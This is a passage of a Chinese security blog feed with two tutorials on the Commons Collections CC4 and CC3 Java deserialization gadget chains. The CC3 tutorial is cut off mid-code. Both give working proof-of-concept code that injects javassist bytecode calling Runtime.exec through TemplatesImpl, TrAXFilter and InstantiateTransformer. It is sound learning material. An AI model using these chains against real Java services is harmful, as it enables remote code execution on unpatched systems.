        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC1、2、3过完，4也是变种，还是单独列出来方便整理吧，写一起太乱了。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：4.0（漏洞版本在4.0）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>在学cc2的时候，使用到了两条链：</p><ul><li><font color="red">ChainedTransformer(Runtime)</font>+<font color="red">PriorityQueue</font>：通过ChainedTransformer串联Runtime恶意方法，添加到PriorityQueue队列比较器中，在添加元素时触发利用。</li><li><font color="red">字节码</font>+<font color="red">PriorityQueue</font>：通过invokerTransformer调用templates.newTransformer()方法，并作为比较器添加到PriorityQueue队列中，添加templates对象作为元素时，比较时调用templates.newTransformer()方法触发利用。</li></ul><p>在cc3链中学习时，使用的两个链：</p><ul><li>通过<font color="red">字节码</font>+<font color="red">(TrAXFilter+InstantiateTransformer)</font>+<font color="red">LazyMap</font>：通过LazyMap调用invoke方法执行到ChainedTransformer中的(TrAXFilter+InstantiateTransformer)，实例化TrAXFilter对象，并执行templates.newTransformer()方法触发利用。</li><li>通过<font color="red">字节码</font>+<font color="red">(TrAXFilter+InstantiateTransformer)</font>+<font color="red">TransformedMap</font>：通过TransformedMap重写的反序列化调用ChainedTransformer中的(TrAXFilter+InstantiateTransformer)，实例化TrAXFilter对象，并执行templates.newTransformer()方法触发利用。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>序列化利用链触发方法简单形容就是：恶意代码构造+触发点+序列化入口</p><p>而cc4中把cc2、cc3中可组合利用的部分链进行了组合。</p><p>cc4中利用版本为Commons Collections4，意味着cc2中的PriorityQueue队列仍然可以作为序列化入口（Commons Collections3中TransformingComparator未实现序列化）。</p><p><img src="/posts/e3ecc659/cc4-1.png" title="PriorityQueue队列"></p><p>PriorityQueue队列序列化入口有了，接下来就是触发点和恶意代码构造。</p><p>触发点就为cc3中的(TrAXFilter+InstantiateTransformer)，恶意代码构造为字节码。</p><p><img src="/posts/e3ecc659/cc4-2.png" title="触发点和恶意代码构造"></p><p>cc4的利用链思路就出来了，很简单，简述就是把cc3中的(TrAXFilter+InstantiateTransformer)触发方式跟cc2的第二条链的触发方式替换了一下。</p><p>由于触发点的更换，因此在PriorityQueue队列中无需添加templates对象元素。</p><p>因为在CC3中触发点为<code>invokerTransformer(&quot;newTransformer&quot;)</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>想要调用该触发点，必须在队列首位添加templates对象的元素，才能调用InvokerTransformer.transform(TemplatesImpl)</p><p><img src="/posts/e3ecc659/cc4-3.png" title="添加元素"><br><img src="/posts/e3ecc659/cc4-4.png" title="compare"></p><p>而在cc4中，触发点变成了(TrAXFilter+InstantiateTransformer)作为比较器，目的只需要调用到该比较器即可触发利用，因此无需向队列添加元素，Transformer[]首位为ConstantTransformer对象，传入的任何obj对象都会返回TrAXFilter.class，因此对Obj传入参数并不影响。</p><p><img src="/posts/e3ecc659/cc4-5.png" title="compare"></p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>可以继续按照 恶意代码构造+触发点+序列化入口<br>恶意代码构造依旧把cc2主体代码（字节码）搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建CtClass对象容器</span></span><br><span class="line">ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"><span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line"><span class="comment">//创建新类Exp2</span></span><br><span class="line">CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"><span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">//创建构造函数</span></span><br><span class="line">CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line"><span class="comment">//向构造函数插入字节码</span></span><br><span class="line">cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line"><span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line"><span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure><p>接着触发点，使用cc3中的触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>最后添加PriorityQueue序列化入口，并通过反射设置满足条件，再根据上述分析，去掉添加元素的步骤</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"><span class="comment">//设置优先级队列对象</span></span><br><span class="line">PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//设置比较器</span></span><br><span class="line">setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br></pre></td></tr></table></figure><p>最后反序列化</p><p>得到最后代码poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc4payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc4payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/e3ecc659/cc4-6.png" title="实现demo"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>cc4简述就是cc3中触发代码替换cc2中的触发代码，由于触发代码的改变，无需向队列添加元素，使用比较器时自动触发，比较好理解。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC3链学习与分析</title>
      <link href="/posts/a9d24d12.html"/>
      <url>/posts/a9d24d12.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC1、CC2过完，后面的链相对来说就容易理解很多，就是再利用链上变种调用其他类方法进行实现，继续往后面学吧。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（8u71版本之前，8u71之后漏洞已修复）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>CC1、CC2后的链基本就是正向分析，因为在CC1&#x2F;2中的大部分逆向分析思路已经分析过了，后续的链基本就是在前面的链上面交换利用类和方法实现同一个效果。</p><p>先明确的CC3链使用的东西：LazyMap动态代理、javassist字节码、TemplatesImpl字节码转换成类、PriorityQueue优先级队列，相当于把cc1和cc2串起来用了。</p><p>简述CC1、CC2的实现流程</p><p>CC1（LazyMap链）：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法，随后将<code>LazyMap</code>对象传入<code>AnnotationInvocationHandler</code>代理类。</li><li>通过动态代理，在生成二次代理对象时调用对象的<code>invoke</code>方法，其中<code>invoke</code>方法中调用<code>LazyMap.get()</code>方法、<code>get()</code>方法调用<code>ChainedTransformer.transform()</code>方法最后实现<code>InvokerTransformer.transform()</code>执行命令;</li></ul><p>CC2（TemplatesImpl）：</p><ul><li>通过反射调用<code>InvokerTransformer</code>构造方法传递方法名<code>getOutputProperties/newTransformer</code>。</li><li>通过<code>javassist</code>生成恶意代码的字节码。</li><li>通过<code>TemplatesImpl</code>将字节码转化成类。</li><li>将反射<code>InvokerTransformer</code>对象作为比较器传递入<code>PriorityQueue</code>优先级队列。</li><li>将<code>TemplatesImpl</code>对象元素添加入<code>PriorityQueue</code>队列。</li><li>在比较器进行元素比较时触发<code>TemplatesImpl</code>的<code>getOutputProperties/newTransformer</code>方法，触发漏洞。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先不直接给出cc3的poc，先看下调用变化，尽可能逆向思维分析。</p><p>主体上还是使用了<code>javassist</code>&amp;<code>TemplatesImpl</code>，生成恶意字节码再转化字节码解析成类进行调用，在分析CC2的时候提到调用<code>TemplatesImpl</code>的（<code>getOutputProperties()</code>或者<code>newTransformer()</code>）方法。</p><p>其中<code>getOutputProperties()</code>方法是<code>newTransformer()</code>的本类的上层调用，其中<code>newTransformer()</code>还有其他类的调用在CC2分析中过掉了，再看看其他类的调用情况</p><p><img src="/posts/a9d24d12/cc3-1.png" title="newTransformer调用"></p><p>发现除了cc2利用链的<code>getOutputProperties()</code>方法外，还剩3个方法（<code>TransformerFactoryImpl.newTransformer()</code>、<code>TransformerFactoryImpl.newTransformerHandler()</code>、<code>TrAXFilter.TrAXFilter()</code>）</p><p>其中<code>TransformerFactoryImpl.newTransformer()</code>和<code>TransformerFactoryImpl.newTransformerHandler()</code>方法都是<code>TransformerFactoryImpl</code>类的方法，要调用该两个方法，首先得创建该类的实例，再去调用这两个方法，其次，<code>TransformerFactoryImpl</code>类并未实现序列化接口，该类的实例无法直接进行序列化，只能通过其他类进行调用，向上未发现能形成链的调用类。</p><p><img src="/posts/a9d24d12/cc3-2.png" title="TransformerFactoryImpl"></p><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p>剩下还有一个<code>TrAXFilter.TrAXFilter()</code>方法，TrAXFilter()方法是TrAXFilter类的构造方法。</p><p>该类的描述</p><blockquote><p>XMLFilterImpl的骨架扩展</p></blockquote><p><img src="/posts/a9d24d12/cc3-3.png" title="TrAXFilter方法"></p><p>该类通过将<code>Templates</code>对象作为参数传递进构造方法，且没有其他条件，这里进行了强制转换成<code>TransformerImpl</code>类，进而直接调用<code>(TransformerImpl)Templates.newTransformer()</code>方法</p><p>因此通过构造函数带参实例化<code>TrAXFilter</code>类对象，就能执行恶意代码。</p><p>但由于<code>TrAXFilter</code>类并未实现序列化，因此该类无法直接实例化对象并序列化来执行恶意代码，需要找到一个能实例化该类的方法。</p><h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p>到这确实没法通过逆向思维找到对应调用<code>TrAXFilter类</code>的实例化方法，这里就只有正向分析学习一下。</p><p>该类的描述</p><blockquote><p>通过反射创建新对象实例的Transformer实现</p></blockquote><p>其中构造方法传递两个参数，一个<code>class[]</code>类数组的参数，代表参数类型，一个<code>object[]</code>对象类数组的参数，代表参数值</p><p><img src="/posts/a9d24d12/cc3-4.png" title="InstantiateTransformer"></p><p>其中存在transform方法</p><p><img src="/posts/a9d24d12/cc3-5.png" title="transform"></p><p>这里会先判断传入的input对象是否是Class实例，不是的话直接抛出该类不是Class实例的异常异常，所以这里也必须使用反射传递进来。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                    <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                        + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>随后通过调用input对象的带参构造方法，并传递iArgs对象通过newInstance进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line"><span class="keyword">return</span> con.newInstance(iArgs);</span><br></pre></td></tr></table></figure><p>这里就利用到cc1链中的<code>ChainedTransformer</code>类的方法把<code>TrAXFilter</code>和<code>InstantiateTransformer</code>串起来，通过<code>TrAXFilter</code>反射对象<code>input</code>参数传递入<code>InstantiateTransformer.transform(input)</code>将<code>TrAXFilter</code>对象进行实例化，调用<code>TrAXFilter</code>构造方法中的<code>TransformerImpl.newTransformer</code>，形成完整的利用链。</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>主体没变，依然把cc2中的 <code>javassist</code>生成恶意代码的字节码和<code>TransformerImpl</code>转化字节码为实例类 的代码段搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建CtClass对象容器</span></span><br><span class="line">ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"><span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line"><span class="comment">//创建新类Exp2</span></span><br><span class="line">CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"><span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line"><span class="comment">//创建构造函数</span></span><br><span class="line">CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line"><span class="comment">//向构造函数插入字节码</span></span><br><span class="line">cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line"><span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line"><span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line"><span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure><p>恶意字节码以及转化实例的代码有了，接下来就是找到调用，通过<code>TrAXFilter</code>和<code>InstantiateTransformer</code>串联起来作为触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//串联TrAXFilter类和InstantiateTransformer类。</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取TrAXFilter类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="comment">//调用InstantiateTransformer方法，实例化TrAXFilter对象，并执行TransformerImpl.newTransformer()方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>接下来使用CC1中的LazyMap链的后半段通过动态代理调用invoke方法执行<code>transformerChain.transform()</code>作为序列化入口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line"><span class="comment">//反射调用AnnotationInvocationHandler类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span 